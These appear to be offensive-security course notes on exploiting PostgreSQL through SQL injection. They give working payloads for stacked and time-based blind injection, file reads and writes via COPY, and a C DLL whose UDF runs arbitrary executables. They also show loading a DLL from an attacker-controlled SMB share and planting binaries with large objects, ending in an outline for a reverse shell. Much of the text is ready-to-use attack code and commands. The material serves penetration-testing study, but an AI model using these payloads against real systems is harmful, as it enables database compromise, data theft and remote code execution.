# PostgreSQL

### Notes

- String manipulation functions: https://www.postgresql.org/docs/14/functions-string.html
- Postgres SQL-injection attacks allow an attacker to perform **stacked queries**. This means that we can use a query terminator character in our payload (;), and inject a completely new query into the original vulnerable query string. This makes exploitation much easier since neither the injection point nor the payload are limited by the nature of the vulnerable query.

### Checklist

- [x] Check if user is DBA: `SELECT current_setting('is_superuser'); //'on' or 'off'`

### Quoted String Bypass

**Piping**

You can select individual characters using their code points (numbers that represent characters) and concatenate them together using the double pipe (||) operator.

> Note: This does not work for all SQL statements. See below for further bypasses.

```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
 ?column?
----------
 AWAE
(1 row)
```

**Dollar-quoted String Constants**

[Lexical Structure](https://www.postgresql.org/docs/14/sql-syntax-lexical.html) in PostgreSQL allows other methods to represent strings. One is support for dollar-quoted string constants. Two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag". The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well:

```
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;

CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

COPY 1

Query returned successfully in 201 msec.
```

### Time-based Injection

Check if executing as DBA:
```
SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
```

### Write to a File

```
COPY (select $$awae$$) to <file_name>
COPY (select $$awae$$) to $$C:\pwnd.txt$$
```
> Postgres COPY TO function does not support newline control characters in a single SELECT statement.
> Use a base64 encoded, then URL encoded string to reliably write file contents. If the URL query string will exceed the max URL length (2048 characters), try convert method to POST.

Example:

```
COPY (SELECT convert_from(decode($$B64_URL_ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) TO $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```

1. We need to use base64 encoding to avoid any issues with restricted characters within the COPY TO function.
2. We also need to URL encode the payload so that nothing gets mangled by the web server itself.
3. Finally, we need to use the `convert_from` function to convert the output of the decode function to a human-readable format to be stored in the destination file.

### Read a File

```
DROP TABLE IF EXISTS awae;
CREATE temp table awae (content text);
COPY awae FROM $$c:\awae.txt$$;
SELECT content FROM awae;
DROP TABLE awae;
```

**Exfiltrating data (Blind)**

```
create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
```

### PostgreSQL Extensions

We can load an extension using the following syntax style:

`CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;`

**Loading a Custom Dynamic Library**

> The compiled extension we want to load must define an appropriate Postgres structure (magic block) to ensure that a dynamic library file is not loaded into an incompatible server. If the target library doesn't have this magic block (as is the case with all standard system libraries), then the loading process will fail.

```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
SELECT system('hostname');
ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.

********** Error **********
```

As seen above, the loading process failed which means that a custom dynamic library must be compiled.

```
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed */
Datum
awae(PG_FUNCTION_ARGS)
{
	   /* convert text pointer to C string */
    #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

    /* retrieve the second argument that is passed to the function (an integer)
    that will serve as our counter limit*/
    int instances = PG_GETARG_INT32(1);

    for (int c = 0; c < instances; c++) {
        /*launch the process passed in the first parameter*/
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
	PG_RETURN_VOID();
}
```

The template above can be used to build a basic extension. We can initiate the build process by going to `Build > Build Solution` in Visual Studio.

The following queries will create and run a UDF called test, bound to the awae function exported by our custom DLL.

```
create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
SELECT test($$calc.exe$$, 3);
```

To remove the DLL whilst debugging, use the following, then edit your extension code, re-compile, and re-test the extension:

```
c:\> net stop "Applications Manager"
c:\> del c:\awae.dll
c:\> net start "Applications Manager"
DROP FUNCTION test(text, integer);
```

**Load a remote DLL**

The source DLL file we are using for the UDF could be also located on a network share.

Start and SMB server: `kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae/`

```
CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
SELECT remote_test($$calc.exe$$, 3);
```

See [PostgreSQL Extensions](/skeleton-scripts/PostgreSQL%20Extensions/) for skeleton code for a reverse shell DLL.

### PostgreSQL Large Objects

As it is not possible to transfer binary data using the COPY functions, another solution is needed to not have to rely on using network (SMB) to transfer data.

PostgreSQL exposes a structure called _large object_, which is used for storing data that would be difficult to handle in its entirety. A typical example of data that can be stored as a large object in PostgreSQL is an image or a PDF document. As opposed to the `COPY TO` function, the advantage of large objects lies in the fact that the data they hold can be exported back to the file system as an identical copy of the original imported file.

The process looks like the following:
1. Create a large object that will hold our binary payload (e.g. a custom DLL file we created)
2. Export that large object to the remote server file system
3. Create a UDF that will use the exported DLL as source
4. Trigger the UDF and execute arbitrary code

A large object is created by calling the `lo_import` function and passing the path to the file we want to import:

> As the return value, we are provided with the loid of the large object that was created. The loid is integral to being able to reference the large object, therefore we it is always best to pass a user-supplied loid (second parameter) so we have knowledge of the id, otherwise it would otherwise be more difficult to retrieve this id in certain exploit scenarios.

```
amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
 lo_import
-----------
      1337
(1 row)
```

To load our arbitrary binary data, we can first create a large object from an arbitrary file on the remote system and then directly update its entry in the database with the content of our choice. Large objects are stored in a table called `pg_largeobject`:

> When large objects are imported into a PostgreSQL database, they are split into 2KB chunks, which are then stored individually in the pg_largeobject table.

```
amdb=# select loid, pageno from pg_largeobject;
 loid | pageno
------+--------
 1337 |      0
(1 row)
```

The data looks like the following:

```
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno |           encode
------+--------+----------------------------
 1337 |      0 | ; for 16-bit app support\r+
      |        | [fonts]\r                 +
      |        | [extensions]\r            +
      |        | [mci extensions]\r        +
      |        | [files]\r                 +
      |        | [Mail]\r                  +
      |        | MAPI=1\r                  +
      |        |
(1 row)
```

Now we can update the content:

```
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
UPDATE 1
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno | encode
------+--------+--------
 1337 |      0 | w00t
(1 row)
```

Finally, use `lo_export` to export an arbitrary large object back to the file system:

```
amdb=# select lo_export(1337, 'C:\\new_win.ini');
 lo_export
-----------
         1
(1 row)
```

> To delete a given large object from the database, we can use the `lo_unlink` function.

```
amdb=# \lo_unlink 1337
lo_unlink 1337
amdb=# \lo_list
      Large objects
 ID | Owner | Description
----+-------+-------------
(0 rows)
```

### UDF Large Object to Reverse Shell

1. Create a DLL file that will contain our malicious code
2. Inject a query that creates a large object from an arbitrary remote file on disk
3. Inject a query that updates page 0 of the newly created large object with the first 2KB of our DLL
4. Inject queries that insert additional pages into the pg_largeobject table to contain the remainder of our DLL
5. Inject a query that exports our large object (DLL) onto the remote server file system
6. Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported DLL
7. Inject a query that executes our newly created UDF

> See [here](/skeleton-scripts/PostgreSQL%20Extensions/postgresql_large_object_reverse_shell.py) for a UDF large object reverse shell PoC.
